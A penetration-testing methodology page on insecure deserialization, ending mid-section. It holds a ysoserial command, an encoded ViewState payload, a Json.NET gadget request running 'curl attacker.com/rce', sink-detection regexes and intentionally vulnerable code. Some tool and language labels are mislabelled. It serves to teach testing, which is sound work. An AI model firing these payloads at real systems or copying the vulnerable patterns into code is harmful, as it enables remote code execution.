# Insecure Deserialization

## Check List

## Methodology

### Black Box

#### Java Deserialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Then view the requests sent and check if any data is sent as follows

```
"javax.faces.ViewState" value="rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAN0AAE0cHQAEy9wcm90ZWN0ZWQvaG9tZS5qc3A="
```
{% endstep %}

{% step %}
For the uninitiated, the prefix `rO0ABXV` indicates an unencrypted Java Object
{% endstep %}

{% step %}
Then, by creating a dangerous object using the yesoserail tool for the js language, I sent the request by sending a request similar to the one below, and if the code is executed, I say that a vulnerability has occurred

```bash
./java -jar ysoserial.jar URLDNS "<http://listening-host>" | base64
```

now send request

```http
GET /res/login.jsf?javax.faces.ViewState=%72%4f%30%41%42%58%4e%79%41%42%46%71%59%58%5a%68%4c%6e%56%30%61%57%77%75%53%47%46%7a%61%45%31%68%63%41%55%48%32%73%48%44%46%6d%44%52%41%77%41%43%52%67%41%4b%62%47%39%68%5a%45%5a%68%59%33%52%76%63%6b%6b%41%43%58%52%6f%63%6d%56%7a%61%47%39%73%5a%48%68%77%50%30%41%41%41%41%41%41%41%41%78%33%43%41%41%41%41%42%41%41%41%41%41%42%63%33%49%41%44%47%70%68%64%6d%45%75%62%6d%56%30%4c%6c%56%53%54%4a%59%6c%4e%7a%59%61%2f%4f%52%79%41%77%41%48%53%51%41%49%61%47%46%7a%61%45%4e%76%5a%47%56%4a%41%41%52%77%62%33%4a%30%54%41%41%4a%59%58%56%30%61%47%39%79%61%58%52%35%64%41%41%53%54%47%70%68%64%6d%45%76%62%47%46%75%5a%79%39%54%64%48%4a%70%62%6d%63%37%54%41%41%45%5a%6d%6c%73%5a%58%45%41%66%67%41%44%54%41%41%45%61%47%39%7a%64%48%45%41%66%67%41%44%54%41%41%49%63%48%4a%76%64%47%39%6a%62%32%78%78%41%48%34%41%41%30%77%41%41%33%4a%6c%5a%6e%45%41%66%67%41%44%65%48%44%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%33%51%41%4c%47%6b%7a%62%58%59%32%5a%44%42%76%4d%57%70%78%4d%7a%56%70%64%54%67%79%5a%6a%63%79%5a%57%35%7a%5a%54%4d%31%4f%58%64%34%62%6d%78%6a%4c%6d%39%68%63%33%52%70%5a%6e%6b%75%59%32%39%74%64%41%41%41%63%51%42%2b%41%41%56%30%41%41%52%6f%64%48%52%77%63%48%68%30%41%44%4e%6f%64%48%52%77%4f%69%38%76%61%54%4e%74%64%6a%5a%6b%4d%47%38%78%61%6e%45%7a%4e%57%6c%31%4f%44%4a%6d%4e%7a%4a%6c%62%6e%4e%6c%4d%7a%55%35%64%33%68%75%62%47%4d%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%31%34 HTTP/1.1
Host: localhost:9060
```

the Response

```http
HTTP/1.1 500 Internal Server Error
X-Powered-By: Servlet/3.1
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Type: text/html;charset=ISO-8859-1
$WSEP: 
Content-Language: en-US
Connection: Close
Date: Mon, 19 Feb 2024 03:16:40 GMT
Content-Length: 103

Error 500: javax.servlet.ServletException: java.util.HashMap incompatible with [Ljava.lang.Object&#59;
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Insecure Deserialization (Trusted & Untrusted Signed Object Confusion)

{% stepper %}
{% step %}
Map the entire target system using the Burp Suite tool
{% endstep %}

{% step %}
Map the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Then review the endpoint process responsible for generating, processing, validating, or receiving **License / Activation / Trial** data in the code logic, and check whether it uses `getObject` and `deserialize`, like in the code below

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C# " %}
```regex
(?<Source>byte\[\]|Stream)|(?<Sink>BinaryFormatter|NetDataContractSerializer|Deserialize\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>byte\[\]\s+\w+)|(?<Sink>deserialize(UntrustedSignedObject)?\s*\(|SignedObject\s*\.\s*getObject\s*\(|getObject\s*\()
```
{% endtab %}

{% tab title="PHP " %}
```regex
(?<Source>\$_(GET|POST|REQUEST)|\$[a-zA-Z0-9_]+)|(?<Sink>unserialize\s*\(|__wakeup|__destruct)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>Buffer|req\.body)|(?<Sink>JSON\.parse\s*\(|deserialize\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection (Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
(byte\[\]|Stream)|(BinaryFormatter|NetDataContractSerializer|Deserialize\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>byte\[\]\s+\w+)|(?<Sink>deserialize(UntrustedSignedObject)?\s*\(|SignedObject\s*\.\s*getObject\s*\(|getObject\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_(GET|POST|REQUEST)|\$[a-zA-Z0-9_]+)|(unserialize\s*\(|__wakeup|__destruct)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(Buffer|req\.body)|(JSON\.parse\s*\(|deserialize\s*\()
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
private static byte[] Verify(byte[] data, KeyConfig keyConfig)
{
    string algorithm = keyConfig.Version == "2" ? "SHA512withRSA" : "SHA1withDSA";

    using var publicKey = GetPublicKey(keyConfig);
    using var signature = System.Security.Cryptography.SignatureAlgorithm.Create(algorithm); // placeholder, باید mapping دقیق RSA/DSA داشته باشه

    var signedObject = (SignedObject)JavaSerializationUtilities.Deserialize(data, typeof(SignedObject), new Type[] { typeof(byte[]) }); // [1]

    if (keyConfig.IsServer)
    {
        var container = (SignedContainer)JavaSerializationUtilities.DeserializeUntrustedSignedObject(signedObject, typeof(SignedContainer), new Type[] { typeof(byte[]) });
        return container.Data;
    }
    else
    {
        bool verified = signedObject.Verify(publicKey, signature); // [2]
        if (!verified)
        {
            throw new IOException("Unable to verify signature!");
        }
        var signedContainer = (SignedContainer)signedObject.Object; // [3]
        return signedContainer.Data;
    }
}
```
{% endtab %}

{% tab title="JavaScript" %}
```java
public static Object verify(byte[] data, KeyConfig keyConfig) throws Exception {
    String algorithm = "2".equals(keyConfig.getVersion()) ? "RSA-SHA512" : "DSA-SHA1";

    PublicKey publicKey = getPublicKey(keyConfig);

    SignedObject signedObject =
            JavaSerializationUtilities.deserialize(data, SignedObject.class); // [1]

    if (keyConfig.isServer()) {
        SignedContainer container =
                JavaSerializationUtilities.deserializeUntrustedSignedObject(
                        signedObject, SignedContainer.class);
        return container.getData();
    } else {
        Signature verifier = Signature.getInstance(algorithm);
        boolean verified = signedObject.verify(publicKey, verifier); // [2]
        if (!verified) {
            throw new Exception("Unable to verify signature!");
        }
        SignedContainer signedContainer =
                (SignedContainer) signedObject.getObject(); // [3]
        return signedContainer.getData();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function verify($data, $keyConfig) {
    $algorithm = ($keyConfig->getVersion() === "2") ? "SHA512" : "SHA1";

    $publicKey = getPublicKey($keyConfig);

    $signedObject = JavaSerializationUtilities::deserialize($data, SignedObject::class, [ 'byte[]' ]); // [1]

    if ($keyConfig->isServer()) {
        $container = JavaSerializationUtilities::deserializeUntrustedSignedObject($signedObject, SignedContainer::class, [ 'byte[]' ]);
        return $container->getData();
    } else {
        $verified = $signedObject->verify($publicKey, $algorithm); // [2]
        if (!$verified) {
            throw new \Exception("Unable to verify signature!");
        }
        $signedContainer = $signedObject->getObject(); // [3]
        return $signedContainer->getData();
    }
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
async function verify(data, keyConfig) {
    const algorithm = keyConfig.version === "2" ? "RSA-SHA512" : "DSA-SHA1";

    const publicKey = getPublicKey(keyConfig);

    const signedObject = await JavaSerializationUtilities.deserialize(data, SignedObject); // [1]

    if (keyConfig.isServer) {
        const container = await JavaSerializationUtilities.deserializeUntrustedSignedObject(signedObject, SignedContainer);
        return container.getData();
    } else {
        const verifier = crypto.createVerify(algorithm);
        const verified = signedObject.verify(publicKey, verifier); // [2]
        if (!verified) {
            throw new Error("Unable to verify signature!");
        }
        const signedContainer = signedObject.getObject(); // [3]
        return signedContainer.getData();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then send a license request with a malicious serialized payload and record the vulnerability
{% endstep %}
{% endstepper %}

***

#### Deserialize Cookie Data

{% stepper %}
{% step %}
Map the entire target system or product using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
In the system or product, look for the main entry point and the update management/distribution page that is responsible for receiving updates
{% endstep %}

{% step %}
On this page, look for endpoints that use SOAP
{% endstep %}

{% step %}
After mapping all endpoints, search for endpoint names such as `Token`, `Authorize`, `Authenticate`, or `GetCookie`
{% endstep %}

{% step %}
Then find and review the function in the code that processes the cookie endpoint, like in the code below

{% tabs %}
{% tab title="C#" %}
```csharp
public Cookie GetCookie(AuthorizationCookie[] authCookies, Cookie oldCookie, DateTime lastChange, DateTime currentTime, string protocolVersion)
{
    if (Client.clientImplementation == null)
    {
        Client.CreateClientImplementation();
    }

    string ipaddress = this.GetIPAddress();

    return Client.clientImplementation.GetCookie(
        authCookies,
        oldCookie,
        lastChange,
        currentTime,
        protocolVersion,
        ipaddress
    );
}
```
{% endtab %}

{% tab title="Java" %}
```java
public Cookie getCookie(AuthorizationCookie[] authCookies,
                        Cookie oldCookie,
                        Date lastChange,
                        Date currentTime,
                        String protocolVersion) {

    if (Client.clientImplementation == null) {
        Client.createClientImplementation();
    }

    String ipaddress = this.getIPAddress();

    return Client.clientImplementation.getCookie(
            authCookies,
            oldCookie,
            lastChange,
            currentTime,
            protocolVersion,
            ipaddress
    );
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function getCookie($authCookies, $oldCookie, $lastChange, $currentTime, $protocolVersion)
{
    if (Client::$clientImplementation === null) {
        Client::createClientImplementation();
    }

    $ipaddress = $this->getIPAddress();

    return Client::$clientImplementation->getCookie(
        $authCookies,
        $oldCookie,
        $lastChange,
        $currentTime,
        $protocolVersion,
        $ipaddress
    );
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function getCookie(authCookies, oldCookie, lastChange, currentTime, protocolVersion) {

    if (Client.clientImplementation == null) {
        Client.createClientImplementation();
    }

    const ipaddress = this.getIPAddress();

    return Client.clientImplementation.getCookie(
        authCookies,
        oldCookie,
        lastChange,
        currentTime,
        protocolVersion,
        ipaddress
    );
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
In the processing flow, the code execution goes to the `CrackAuthorizationCookie` method. Then the data is processed inside the `UnencryptedAuthorizationCookieData` and `CrackAuthorizationCookie` classes. In the `DecryptData` method, the main data processing happens, and based on a condition in the code, the data is passed to a `deserialize` function using `BinaryFormatter`

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(BinaryFormatter\s+\w+\s*=\s*new\s+BinaryFormatter\s*\(\))|(\.Deserialize\s*\()|(NetDataContractSerializer\s*\()|(LosFormatter\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(ObjectInputStream\s*\()|(\.readObject\s*\()|(XMLDecoder\s*\()|(readUnshared\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(unserialize\s*\()|(yaml_parse\s*\()|(igbinary_unserialize\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(serialize\.(unserialize|deserialize)\s*\()|(JSON\.parse\s*\()|(v8\.deserialize\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
BinaryFormatter\s+\w+\s*=\s*new\s+BinaryFormatter\s*\(\)|\.Deserialize\s*\(|NetDataContractSerializer\s*\(|LosFormatter\s*\(
```
{% endtab %}

{% tab title="Java" %}
```regex
ObjectInputStream\s*\(|\.readObject\s*\(|XMLDecoder\s*\(|readUnshared\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regex
unserialize\s*\(|yaml_parse\s*\(|igbinary_unserialize\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regex
serialize\.(unserialize|deserialize)\s*\(|JSON\.parse\s*\(|v8\.deserialize\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
internal object DecryptData(byte[] cookieData)
{
    if (cookieData == null)
    {
        throw new LoggedArgumentNullException("cookieData");
    }

    ICryptoTransform cryptoTransform = this.cryptoServiceProvider.CreateDecryptor();
    byte[] array;

    try
    {
        if (cookieData.Length % cryptoTransform.InputBlockSize != 0 || cookieData.Length <= cryptoTransform.InputBlockSize)
        {
            throw new LoggedArgumentException(
                "Can't decrypt bogus cookieData; data is size, " + cookieData.Length + 
                ", which is not a multiple of " + cryptoTransform.InputBlockSize,
                "cookieData"
            );
        }

        array = new byte[cookieData.Length - cryptoTransform.InputBlockSize];
        cryptoTransform.TransformBlock(cookieData, 0, cryptoTransform.InputBlockSize, EncryptionHelper.scratchBuffer, 0);
        cryptoTransform.TransformBlock(cookieData, cryptoTransform.InputBlockSize, cookieData.Length - cryptoTransform.InputBlockSize, array, 0);
    }
    finally
    {
        cryptoTransform.Dispose();
    }

    object obj = null;

    if (this.classType == typeof(UnencryptedCookieData))
    {
        UnencryptedCookieData unencryptedCookieData = new UnencryptedCookieData();
        try
        {
            unencryptedCookieData.Deserialize(array);
        }
        catch (Exception ex)
        {
            if (ex is OutOfMemoryException) throw;
            throw new LoggedArgumentException(ex.ToString(), "cookieData");
        }
        obj = unencryptedCookieData;
    }
    else
    {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream memoryStream = new MemoryStream(array);
        try
        {
            obj = binaryFormatter.Deserialize(memoryStream);
        }
        catch (Exception ex2)
        {
            if (ex2 is OutOfMemoryException) throw;
            throw new LoggedArgumentException(ex2.ToString(), "cookieData");
        }

        if (obj.GetType() != this.classType)
        {
            throw new LoggedArgumentException(
                "Decrypted cookie has the wrong data type. Expected type = " + this.classType +
                ", actual type = " + obj.GetType(),
                "cookieData"
            );
        }
    }

    return obj;
}

```
{% endtab %}

{% tab title="Java" %}
```java
protected Object decryptData(byte[] cookieData) throws Exception {
    if (cookieData == null) {
        throw new LoggedArgumentNullException("cookieData");
    }

    Cipher cryptoTransform = this.cryptoServiceProvider.createDecryptor();
    byte[] array;

    try {
        int blockSize = cryptoTransform.getBlockSize();
        if (cookieData.length % blockSize != 0 || cookieData.length <= blockSize) {
            throw new LoggedArgumentException(
                "Can't decrypt bogus cookieData; data is size, " + cookieData.length +
                ", which is not a multiple of " + blockSize,
                "cookieData"
            );
        }

        array = new byte[cookieData.length - blockSize];
        cryptoTransform.update(cookieData, 0, blockSize, EncryptionHelper.scratchBuffer, 0);
        cryptoTransform.update(cookieData, blockSize, cookieData.length - blockSize, array, 0);
    } finally {
        cryptoTransform.doFinal();
    }

    Object obj = null;

    if (this.classType == UnencryptedCookieData.class) {
        UnencryptedCookieData unencryptedCookieData = new UnencryptedCookieData();
        try {
            unencryptedCookieData.deserialize(array);
        } catch (Exception ex) {
            throw new LoggedArgumentException(ex.toString(), "cookieData");
        }
        obj = unencryptedCookieData;
    } else {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(array);
             ObjectInputStream ois = new ObjectInputStream(bis)) {

            obj = ois.readObject();
        } catch (Exception ex2) {
            throw new LoggedArgumentException(ex2.toString(), "cookieData");
        }

        if (!obj.getClass().equals(this.classType)) {
            throw new LoggedArgumentException(
                "Decrypted cookie has the wrong data type. Expected type = " + this.classType +
                ", actual type = " + obj.getClass(),
                "cookieData"
            );
        }
    }

    return obj;
}

```
{% endtab %}

{% tab title="PHP" %}
```php
protected function decryptData($cookieData)
{
    if ($cookieData === null) {
        throw new LoggedArgumentNullException("cookieData");
    }

    $cryptoTransform = $this->cryptoServiceProvider->createDecryptor();
    $array = null;

    try {
        $blockSize = $cryptoTransform->getBlockSize();
        if (strlen($cookieData) % $blockSize != 0 || strlen($cookieData) <= $blockSize) {
            throw new LoggedArgumentException(
                "Can't decrypt bogus cookieData; data is size, " . strlen($cookieData) .
                ", which is not a multiple of " . $blockSize,
                "cookieData"
            );
        }

        $array = substr($cookieData, $blockSize);
        $cryptoTransform->transformBlock(substr($cookieData, 0, $blockSize), EncryptionHelper::$scratchBuffer);
        $cryptoTransform->transformBlock($array, $array);
    } finally {
        $cryptoTransform->dispose();
    }

    $obj = null;

    if ($this->classType === UnencryptedCookieData::class) {
        $unencryptedCookieData = new UnencryptedCookieData();
        try {
            $unencryptedCookieData->deserialize($array);
        } catch (Exception $ex) {
            throw new LoggedArgumentException($ex->getMessage(), "cookieData");
        }
        $obj = $unencryptedCookieData;
    } else {
        try {
            $obj = unserialize($array);
        } catch (Exception $ex2) {
            throw new LoggedArgumentException($ex2->getMessage(), "cookieData");
        }

        if (get_class($obj) !== $this->classType) {
            throw new LoggedArgumentException(
                "Decrypted cookie has the wrong data type. Expected type = " . $this->classType .
                ", actual type = " . get_class($obj),
                "cookieData"
            );
        }
    }

    return $obj;
}

```
{% endtab %}

{% tab title="Node.js" %}
```js
function decryptData(cookieData) {
    if (!cookieData) {
        throw new LoggedArgumentNullException("cookieData");
    }

    const cryptoTransform = this.cryptoServiceProvider.createDecryptor();
    let array;

    try {
        const blockSize = cryptoTransform.getBlockSize();
        if (cookieData.length % blockSize !== 0 || cookieData.length <= blockSize) {
            throw new LoggedArgumentException(
                `Can't decrypt bogus cookieData; data is size, ${cookieData.length}, which is not a multiple of ${blockSize}`,
                "cookieData"
            );
        }

        array = cookieData.slice(blockSize);
        cryptoTransform.transformBlock(cookieData.slice(0, blockSize), EncryptionHelper.scratchBuffer);
        cryptoTransform.transformBlock(array, array);
    } finally {
        cryptoTransform.dispose();
    }

    let obj = null;

    if (this.classType === UnencryptedCookieData) {
        const unencryptedCookieData = new UnencryptedCookieData();
        try {
            unencryptedCookieData.deserialize(array);
        } catch (ex) {
            throw new LoggedArgumentException(ex.toString(), "cookieData");
        }
        obj = unencryptedCookieData;
    } else {
        try {
            obj = JSON.parse(array); // Node.js approximation for BinaryFormatter
        } catch (ex2) {
            throw new LoggedArgumentException(ex2.toString(), "cookieData");
        }

        if (obj.constructor !== this.classType) {
            throw new LoggedArgumentException(
                `Decrypted cookie has the wrong data type. Expected type = ${this.classType}, actual type = ${obj.constructor}`,
                "cookieData"
            );
        }
    }

    return obj;
}

```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

#### Remote Code Execution via Polymorphic Webhook Routing in Event-Driven Service Meshes

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous ingress boundaries, specifically B2B Webhook receivers (e.g., Stripe, GitHub, or custom partner integrations)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify an Event-Driven Service Mesh architecture. Modern enterprise platforms decouple the API Gateway from background processing. The Gateway receives millions of webhooks, immediately acknowledges them with `202 Accepted`, and pushes them onto an internal message broker (Kafka, RabbitMQ)
{% endstep %}

{% step %}
Investigate the "Generic Event Routing" optimization within the API Gateway. Maintaining hundreds of distinct Data Transfer Objects (DTOs) for every possible partner webhook is an enormous engineering burden
{% endstep %}

{% step %}
Discover the architectural shortcut: To eliminate strict schema maintenance, the Gateway developer implements a "Polymorphic Wrapper". The Gateway captures the raw incoming JSON, reads a routing parameter (like a URL path or HTTP header), and constructs a generic envelope (e.g., `{"TargetClass": "com.enterprise.StripeEvent", "Payload": "{...}"}`)
{% endstep %}

{% step %}
Analyze the background Kafka Consumer responsible for processing these events
{% endstep %}

{% step %}
Observe the polymorphic deserialization sink: To dynamically reconstruct the specific event object without writing a massive `switch` statement, the consumer utilizes the overarching JSON library's dynamic typing features. It extracts the `TargetClass` string from the envelope and instructs the deserializer to instantiate that exact class, passing the raw `Payload` into it
{% endstep %}

{% step %}
Understand the fatal architectural assumption: The developer assumes that the `TargetClass` identifier is strictly derived from a trusted, hardcoded map inside the API Gateway, and that external partners can only trigger safe, predetermined event classes
{% endstep %}

{% step %}
Examine the API Gateway's routing logic again. Discover a fallback optimization or legacy integration path where the Gateway explicitly allows the external partner to define the target event type via an HTTP header (e.g., `X-Event-Class`) to support rapid onboarding of new event types
{% endstep %}

{% step %}
Authenticate or utilize an unauthenticated public webhook endpoint
{% endstep %}

{% step %}
Construct a malicious JSON payload representing a known Deserialization Gadget Chain (e.g., `ObjectDataProvider` in C#, `ChainedTransformer` in Java)
{% endstep %}

{% step %}
Inject the fully qualified class name of your Gadget Chain into the routing header or URL parameter (e.g., `X-Event-Class: org.apache.commons.collections.functors.AnnotationInvocationHandler`)
{% endstep %}

{% step %}
The API Gateway wraps your payload, assigns your Gadget Chain as the `TargetClass`, and pushes it to Kafka
{% endstep %}

{% step %}
The internal consumer pulls the message, blindly resolves the injected class name, and instantiates the Gadget Chain using your payload data, executing arbitrary system commands deep within the protected processing cluster

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:JsonConvert\.DeserializeObject\s*<.*>\s*\(|JsonConvert\.DeserializeObject\s*\(.*Type\.GetType\s*\(|JsonSerializer\.Deserialize\s*\(.*Type\.GetType\s*\(|Activator\.CreateInstance\s*\(\s*Type\.GetType\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:mapper\.readValue\s*\(.*Class\.forName\s*\(|ObjectMapper\.readValue\s*\(.*JavaType|enableDefaultTyping|ClassLoader\.loadClass\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:unserialize\s*\(.*\$[A-Za-z_][A-Za-z0-9_]*->payload\s*\)|unserialize\s*\(\s*\$_(?:POST|GET|REQUEST|COOKIE)|serialize\.unserialize\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:serialize\.unserialize\s*\(.*payload|v8\.deserialize\s*\(|deserialize\s*\(.*JSON\.parse)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
JsonConvert\.DeserializeObject\(.*Type\.GetType\(|JsonSerializer\.Deserialize\(.*Type\.GetType\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
mapper\.readValue\(.*Class\.forName\(|ObjectMapper\.readValue\(.*JavaType|enableDefaultTyping
```
{% endtab %}

{% tab title="PHP" %}
```regexp
unserialize\(.*\$event->payload\)|unserialize\(\s*\$_(POST|GET|REQUEST|COOKIE)|serialize\.unserialize\(.*payload\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
serialize\.unserialize\(.*payload|v8\.deserialize\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class WebhookConsumer : IMessageConsumer<EventEnvelope>
{
    public async Task ConsumeAsync(EventEnvelope envelope)
    {
        // [1]
        // [2]
        var targetType = Type.GetType(envelope.TargetClass);

        if (targetType != null)
        {
            // [3]
            // [4]
            var settings = new JsonSerializerSettings 
            { 
                TypeNameHandling = TypeNameHandling.Auto 
            };

            var eventObject = JsonConvert.DeserializeObject(envelope.Payload, targetType, settings);
            
            await _eventProcessor.HandleAsync((dynamic)eventObject);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class WebhookConsumer {

    @Autowired
    private ObjectMapper mapper;

    @KafkaListener(topics = "incoming-webhooks")
    public void consume(EventEnvelope envelope) {
        try {
            // [1]
            // [2]
            Class<?> targetClass = Class.forName(envelope.getTargetClass());

            // [3]
            // [4]
            Object eventObject = mapper.readValue(envelope.getPayload(), targetClass);

            eventProcessor.handle((EventBase) eventObject);

        } catch (Exception e) {
            // Log and discard
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class WebhookConsumer implements ShouldQueue
{
    public function handle(EventEnvelope $envelope)
    {
        // [1]
        // [2]
        $targetClass = $envelope->targetClass;

        if (class_exists($targetClass)) 
        {
            // [3]
            // [4]
            // Legacy internal serialization used for high-speed object transfer
            $eventObject = unserialize($envelope->payload);
            
            $this->eventProcessor->handle($eventObject);
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class WebhookConsumer {
    static async consume(envelope) {
        // [1]
        // [2]
        let TargetClass = global[envelope.targetClass];

        if (TargetClass) {
            // [3]
            // [4]
            // Using node-serialize for complex object IPC transfer
            let eventObject = serialize.unserialize(envelope.payload);

            await eventProcessor.handle(eventObject);
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The consumer pulls a generic `EventEnvelope` from the internal message queue, \[2] The architecture extracts the `TargetClass` string provided by the upstream API Gateway. This prevents the consumer from needing to know the schema of every possible integration partner beforehand, m\[3] The architecture delegates the instantiation process directly to the language's native reflection or serialization engine, \[4] The fatal trust boundary execution. The application blindly trusts the class name defined in the envelope. Because the API Gateway allowed external clients to influence this property (via HTTP headers) to optimize integration onboarding, the attacker dictates the exact Type instantiated by the deserializer. The deserializer automatically invokes dangerous magic methods (e.g., `readObject`, `__wakeup`, constructors) associated with the attacker's injected Gadget Chain

```http
// 1. Attacker sends a webhook payload simulating a B2B partner integration.
// 2. Attacker overrides the internal routing class via the heavily optimized X-Event-Class header.
POST /api/v1/webhooks/dynamic-ingress HTTP/1.1
Host: gateway.enterprise.tld
X-Event-Class: System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
Content-Type: application/json

{
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
      "FileName": "cmd.exe",
      "Arguments": "/c curl attacker.com/rce"
    }
  }
}

// 3. The API Gateway wraps the payload and pushes it to the Kafka topic.
// 4. The background consumer dynamically resolves 'ObjectDataProvider' and feeds it the JSON.
// 5. The Deserializer instantiates the Process class and executes the payload.
```
{% endstep %}

{% step %}
To support infinitely scalable B2B webhook integrations without requiring continuous codebase updates, engineers implemented a dynamic, polymorphic event router. The API Gateway delegated the responsibility of object mapping directly to the underlying JSON deserializer using dynamic type resolution. Developers assumed that the routing metadata (HTTP headers) determining the target class was an inert administrative configuration, not a highly dangerous reflection sink. By supplying a known Gadget Chain class in the routing header, the attacker forced the internal background worker to instantiate a dangerous system object instead of a benign DTO. The deserializer automatically populated the properties of the Gadget Chain using the attacker's payload, triggering a synchronous execution chain that resulted in zero-click Remote Code Execution on the protected internal event bus cluster
{% endstep %}
{% endstepper %}

***

#### Second-Order RCE via JSONB Polymorphism in UI Configuration Persistence

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on highly customizable platforms such as Server-Driven UIs, dynamic form builders, workflow orchestrators, or BI Dashboard creators
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Schema-less Persistence" architecture. To store incredibly complex and deeply nested UI hierarchies (e.g., `Grid -> Row -> Dropdown -> ValidationScript`), creating relational SQL tables for every possible UI component is impossible
{% endstep %}

{% step %}
Investigate the Database abstraction layer. The developer utilizes a NoSQL database (MongoDB) or a relational database with advanced `JSONB` column support (PostgreSQL)
{% endstep %}

{% step %}
Discover the ORM Deserialization optimization. When the backend retrieves the `JSONB` data from the database, it must reconstruct the complex object graph in memory so the application can apply business logic (e.g., checking permissions on specific widgets). To achieve this automatically, the developer configures the Object-Relational Mapper (ORM) to use aggressive Polymorphic Deserialization (e.g., Jackson `@JsonTypeInfo`, Entity Framework `TypeNameHandling.All`)
{% endstep %}

{% step %}
Analyze the fundamental security assumption: The developer assumes that because the data resides within the primary database, it was already validated during the initial `POST` request They view the database as an absolute domain of trust
{% endstep %}

{% step %}
Scrutinize the ingress boundaries. The standard UI builder interface sends structured data which is safely validated. However, discover a secondary integration endpoint, such as "Import Dashboard Template from JSON file" or a REST API designed for automated CI/CD deployments
{% endstep %}

{% step %}
Verify that this secondary bulk-import endpoint bypasses strict DTO validation. Because it expects a massive, arbitrary JSON payload, it maps the raw HTTP body directly into a generic string and inserts it into the `JSONB` column
{% endstep %}

{% step %}
Formulate the Second-Order Gadget payload. Craft a JSON document that perfectly mimics a legitimate dashboard configuration, but inject the polymorphic type indicator (e.g., `@class` or `$type`) into one of the deeply nested child nodes, mapping it to an exploit gadget
{% endstep %}

{% step %}
Authenticate to the application as a low-privilege user
{% endstep %}

{% step %}
Submit the malicious JSON document via the "Import Template" endpoint
{% endstep %}

{% step %}
The backend bypasses validation and saves the payload directly into the `JSONB` column. The initial request returns a safe `200 OK`
{% endstep %}

{% step %}
Wait for a highly privileged user (e.g., a System Administrator reviewing custom templates) to load the dashboard view, or trigger an internal background job that processes UI templates
{% endstep %}

{% step %}
The ORM queries the database, extracts the poisoned `JSONB` column, and invokes the polymorphic deserializer to reconstruct the object graph. The deserializer encounters the injected type marker, instantiates the Gadget Chain, and executes Remote Code Execution under the context of the highly privileged administrative read operation

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:\[Column\s*\(\s*TypeName\s*=\s*"jsonb"\s*\)\]|\[Owned\]|\[ComplexType\]|TypeNameHandling\s*=\s*TypeNameHandling\.(?:All|Auto)|JsonConvert\.DeserializeObject\s*\()
```
